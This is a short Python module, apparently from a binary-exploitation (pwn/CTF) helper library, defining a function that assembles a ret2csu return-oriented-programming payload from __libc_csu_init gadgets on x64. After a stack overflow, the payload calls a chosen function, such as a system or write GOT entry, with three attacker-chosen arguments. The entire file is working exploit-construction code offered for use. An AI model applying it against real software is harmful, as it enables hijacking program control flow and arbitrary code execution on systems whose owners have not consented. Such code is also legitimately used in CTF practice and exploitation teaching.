from . import p64, fakeebp


def gadget_by_csu(__libc_csu_init_end: int, func_to_call: int, param1: int, param2: int, param3: int, ret_addr: int = None):
    '''
    can used in `x64-little` with csu_init function in it.
    exploit csu_init's gadgets
    YOU SHOULD USE IT FROM EBP POSITION OVERFLOW

    __libc_csu_init_end:int the end-address of __libc_csu_init
    func_to_call:int function address , etc. write_got , system_got
    param1/2/3:int address of func's params
    '''
    offset_to_start = 0x24
    offset_gadgets1_to_gadgets2 = 0x16
    gadgets_1 = __libc_csu_init_end - offset_to_start
    gadgets_2 = gadgets_1 + offset_gadgets1_to_gadgets2

    padding_1 = fakeebp(64) * 7
    p = p64(gadgets_2) + fakeebp(64) + p64(0) + p64(1)  # rbx = 0 , rbp = 1
    p += p64(func_to_call) + p64(param3) + p64(param2) + p64(param1)
    p += p64(gadgets_1) + padding_1
    if ret_addr:
        p += p64(ret_addr)
    return p
